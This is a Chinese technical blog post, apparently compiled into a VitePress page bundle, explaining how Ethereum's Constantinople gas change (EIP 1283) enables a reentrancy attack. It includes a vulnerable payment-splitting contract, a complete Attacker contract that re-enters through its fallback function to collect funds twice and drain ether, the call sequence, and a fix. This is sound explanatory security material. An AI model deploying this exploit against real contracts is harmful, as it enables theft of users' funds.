import{_ as s,c as a,o as n,N as l}from"./chunks/framework.3a9190c5.js";const u=JSON.parse('{"title":"君士坦丁堡分叉引起的安全问题","description":"","frontmatter":{"title":"君士坦丁堡分叉引起的安全问题","date":"2019-01-18T14:42:10.000Z","draft":false,"markup":"mmark"},"headers":[],"relativePath":"blockchain/ethereum/君士坦丁堡分叉引起的安全问题.md"}'),p={name:"blockchain/ethereum/君士坦丁堡分叉引起的安全问题.md"},e=l(`<h1 id="君士坦丁堡分叉引起的安全问题" tabindex="-1">君士坦丁堡分叉引起的安全问题 <a class="header-anchor" href="#君士坦丁堡分叉引起的安全问题" aria-label="Permalink to &quot;君士坦丁堡分叉引起的安全问题&quot;">​</a></h1><ul><li><a href="#君士坦丁堡分叉引起的安全问题">君士坦丁堡分叉引起的安全问题</a><ul><li><a href="#一-什么是君士坦丁堡分叉">一. 什么是君士坦丁堡分叉</a></li><li><a href="#二-一个重入合约">二. 一个重入合约</a></li><li><a href="#三-一份尝试攻击的合约">三. 一份尝试攻击的合约</a></li><li><a href="#四-组合调用">四. 组合调用</a><ul><li><a href="#分叉之前">分叉之前</a></li><li><a href="#分叉之后">分叉之后</a></li><li><a href="#调用顺序">调用顺序</a></li></ul></li><li><a href="#五-如何解决">五. 如何解决</a></li></ul></li></ul><h2 id="一-什么是君士坦丁堡分叉" tabindex="-1">一. 什么是君士坦丁堡分叉 <a class="header-anchor" href="#一-什么是君士坦丁堡分叉" aria-label="Permalink to &quot;一. 什么是君士坦丁堡分叉&quot;">​</a></h2><p>君士坦丁堡是最近以太坊的大事,主要做了一下改进</p><ul><li>EIP 145：由两位以太坊开发人员Alex Beregszaszi 和 Pawel Bylica编写的技术升级，EIP 145详细描述了一种更有效的以太坊信息处理方案，其称为逐位移动（bitwise shifting）；</li><li>EIP 1052:由以太坊core开发人员Nick Johnson和Bylica所撰写，1052提供了一种优化以太坊网络大规模代码执行的方法。</li><li>EIP 1283：由Johnson撰写，其基于EIP 1087，这一提议主要了引入了一种针对数据存储更改更公平的定价方法，这可以让智能合约开发者受益。</li><li>EIP 1014：由以太坊创始人Vitalik Buterin亲自创建，此升级的目的是更好地促进基于状态通道和链外（off-chain）交易的扩容解决方案。</li><li>EIP 1234：由以太坊主要客户端 Parity发布经理 Afri Schoedon所倡导，这也是以太坊此次升级中最具争议的部分，它会使以太坊网络的区块奖励从3ETH减少到2ETH，此外还会延迟难度炸弹12个月的时间。</li></ul><p>其中<a href="https://eips.ethereum.org/EIPS/eip-1283" target="_blank" rel="noreferrer">EIP 1283</a> 最重要的改动就是对于修改合约内容更加便宜了,原来修改非0内容的地址需要5000gas,现在只需要200gas. 具体意思就是</p><div class="language-sol line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sol</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">//第一次写入</span></span>
<span class="line"><span style="color:#A6ACCD;">Contract.A=300 //花费20000gas</span></span>
<span class="line"><span style="color:#A6ACCD;">//第二次写入</span></span>
<span class="line"><span style="color:#A6ACCD;">Contract.A=500 //花费5000gas,如果是君士坦丁堡分叉以后只有200gas.</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>这对于DAPP而言肯定是好事,降低了DAPP的成本.但是\b意外却引入了安全风险.</p><h2 id="二-一个重入合约" tabindex="-1">二. 一个重入合约 <a class="header-anchor" href="#二-一个重入合约" aria-label="Permalink to &quot;二. 一个重入合约&quot;">​</a></h2><p>一份双方协调分成的合约,简化起见,里面很多安全问题没检查,比如updateSplit应该只能参与双方更新.</p><div class="language-sol line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sol</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">//PaymentSharer.sol</span></span>
<span class="line"><span style="color:#A6ACCD;">pragma solidity ^0.5.0;</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">contract PaymentSharer {</span></span>
<span class="line"><span style="color:#A6ACCD;">  mapping(uint =&gt; uint) splits;</span></span>
<span class="line"><span style="color:#A6ACCD;">  mapping(uint =&gt; uint) deposits;</span></span>
<span class="line"><span style="color:#A6ACCD;">  mapping(uint =&gt; address payable) first;</span></span>
<span class="line"><span style="color:#A6ACCD;">  mapping(uint =&gt; address payable) second;</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">  function init(uint id, address payable _first, address payable _second) public {</span></span>
<span class="line"><span style="color:#A6ACCD;">    require(first[id] == address(0) &amp;&amp; second[id] == address(0));</span></span>
<span class="line"><span style="color:#A6ACCD;">    require(first[id] == address(0) &amp;&amp; second[id] == address(0));</span></span>
<span class="line"><span style="color:#A6ACCD;">    first[id] = _first;</span></span>
<span class="line"><span style="color:#A6ACCD;">    second[id] = _second;</span></span>
<span class="line"><span style="color:#A6ACCD;">  }</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">  function deposit(uint id) public payable {</span></span>
<span class="line"><span style="color:#A6ACCD;">    deposits[id] += msg.value;</span></span>
<span class="line"><span style="color:#A6ACCD;">  }</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">  function updateSplit(uint id, uint split) public {</span></span>
<span class="line"><span style="color:#A6ACCD;">    require(split &lt;= 100);</span></span>
<span class="line"><span style="color:#A6ACCD;">    splits[id] = split;</span></span>
<span class="line"><span style="color:#A6ACCD;">  }</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">  function splitFunds(uint id) public {</span></span>
<span class="line"><span style="color:#A6ACCD;">    // Here would be: </span></span>
<span class="line"><span style="color:#A6ACCD;">    // Signatures that both parties agree with this split</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">    // Split</span></span>
<span class="line"><span style="color:#A6ACCD;">    address payable a = first[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    address payable b = second[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    uint depo = deposits[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    deposits[id] = 0;</span></span>
<span class="line"><span style="color:#A6ACCD;">     </span></span>
<span class="line"><span style="color:#A6ACCD;">    a.transfer(depo * splits[id] / 100); //transfer 给2100 gas执行事务</span></span>
<span class="line"><span style="color:#A6ACCD;">    b.transfer(depo * (100 - splits[id]) / 100);</span></span>
<span class="line"><span style="color:#A6ACCD;">  }</span></span>
<span class="line"><span style="color:#A6ACCD;">}</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>双方协商一致,调用updateSplit,定下各自应得多少比例.然后就可以调用splitFunds,分别拿走各自的ether. 这在君士坦丁堡分叉之前,是非常安全的.</p><h2 id="三-一份尝试攻击的合约" tabindex="-1">三. 一份尝试攻击的合约 <a class="header-anchor" href="#三-一份尝试攻击的合约" aria-label="Permalink to &quot;三. 一份尝试攻击的合约&quot;">​</a></h2><div class="language-solidity line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">solidity</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;font-style:italic;">pragma</span><span style="color:#A6ACCD;"> </span><span style="color:#F07178;">solidity</span><span style="color:#A6ACCD;"> ^0.5.0</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;font-style:italic;">import</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">&quot;./PaymentSharer.sol&quot;</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">contract</span><span style="color:#FFCB6B;"> Attacker</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#FFCB6B;">address</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">private</span><span style="color:#A6ACCD;"> victim</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#FFCB6B;">address</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">payable</span><span style="color:#A6ACCD;"> owner</span><span style="color:#89DDFF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#C792EA;">constructor</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">) </span><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    owner </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> msg.sender</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#C792EA;">function</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">attack</span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">address</span><span style="color:#A6ACCD;"> </span><span style="color:#A6ACCD;font-style:italic;">a</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">external</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    victim </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> a</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    PaymentSharer x </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">PaymentSharer</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">a</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    x</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">updateSplit</span><span style="color:#89DDFF;">(</span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">100</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    x</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">splitFunds</span><span style="color:#89DDFF;">(</span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#82AAFF;">function</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">payable</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">external</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    PaymentSharer x </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">PaymentSharer</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">victim</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    x</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">updateSplit</span><span style="color:#89DDFF;">(</span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">,</span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">);</span><span style="color:#A6ACCD;"> </span><span style="color:#676E95;font-style:italic;">//修改split,这样下b.transfer就不再是transfer 0,达到双倍收益.</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;">//从合约中拿走全部ether</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#C792EA;">function</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">drain</span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">external</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    owner</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">transfer</span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">address</span><span style="color:#89DDFF;">(this).</span><span style="color:#A6ACCD;">balance</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h2 id="四-组合调用" tabindex="-1">四. 组合调用 <a class="header-anchor" href="#四-组合调用" aria-label="Permalink to &quot;四. 组合调用&quot;">​</a></h2><ul><li><ol><li>PaymentSharer.init(0,Attacker,anotherAddressOfAttacker)</li></ol></li><li><ol start="2"><li>PaymentSharer.deposit(0) value=1ether</li></ol></li><li><ol start="3"><li>Attacker.attack(PaymentSharer)</li></ol></li></ul><p>最关键的是第三步的调用顺序: attack--&gt;updateSplit--&gt;attack---&gt;splitFunds(a全得,b没有)---&gt;a.transfer---&gt;Attacker&#39;s fallback---&gt;updateSplit(a没有,b全得)--&gt;b.transfer</p><p>最终a,b(Attacker和anotherAddressOfAttacker)各拿了一份完整的是后入,而不是预想的只有\b拿走全部.</p><h3 id="分叉之前" tabindex="-1">分叉之前 <a class="header-anchor" href="#分叉之前" aria-label="Permalink to &quot;分叉之前&quot;">​</a></h3><p>合约中调用transfer函数的gas是固定的,只能是2300,无法改动. 而Attacker&#39;s fallback 函数中\b调用updateSplit, 其中 <code>splits[id] = split;</code>这一句话就会消耗5000gas,\b因此attack这个Tx会失败.</p><h3 id="分叉之后" tabindex="-1">分叉之后 <a class="header-anchor" href="#分叉之后" aria-label="Permalink to &quot;分叉之后&quot;">​</a></h3><p><code>splits[id] = split;</code>只会消耗gas200,因此有足够的gas来执行updateSplit, 所以a.transfer会成功,然后b.transfer自然也会成功.</p><h3 id="调用顺序" tabindex="-1">调用顺序 <a class="header-anchor" href="#调用顺序" aria-label="Permalink to &quot;调用顺序&quot;">​</a></h3><p><img alt="" data-src="https://img2018.cnblogs.com/blog/124391/201901/124391-20190118223636042-2098560701.png" loading="lazy" class="lazy"></p><h2 id="五-如何解决" tabindex="-1">五. 如何解决 <a class="header-anchor" href="#五-如何解决" aria-label="Permalink to &quot;五. 如何解决&quot;">​</a></h2><p>针对这个问题解决起来非常简单.下面就是一种修正方法.</p><div class="language-sol line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sol</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">function splitFunds(uint id) public {</span></span>
<span class="line"><span style="color:#A6ACCD;">    // Here would be: </span></span>
<span class="line"><span style="color:#A6ACCD;">    // Signatures that both parties agree with this split</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;">    // Split</span></span>
<span class="line"><span style="color:#A6ACCD;">    address payable a = first[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    address payable b = second[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    uint depo = deposits[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    deposits[id] = 0;</span></span>
<span class="line"><span style="color:#A6ACCD;">    uint s=splits[id];</span></span>
<span class="line"><span style="color:#A6ACCD;">    a.transfer(depo * s / 100); //transfer 给2100 gas执行事务</span></span>
<span class="line"><span style="color:#A6ACCD;">    b.transfer(depo * (100 - s) / 100);</span></span>
<span class="line"><span style="color:#A6ACCD;">  }</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>这样就算是Attacker有了重入的机会,可以执行代码,也不会有任何额外收益. 应该说合约的设计者已经考虑到a.transfer的重入问题,先修改了deposits[id],而不是\b放在transfer之后,但是仍然百密一疏.</p><p><strong>合约一旦发布就无法修改,但是EVM规则却可以通过分叉修改</strong>,可以解决以后的问题,但是却不能修复已经发布的合约.</p><p>本来参考了一下文章 <a href="https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9" target="_blank" rel="noreferrer">Constantinople enables new Reentrancy Attack</a></p>`,30),r=[e];function o(t,c,i,A,C,b){return n(),a("div",null,r)}const D=s(p,[["render",o]]);export{u as __pageData,D as default};
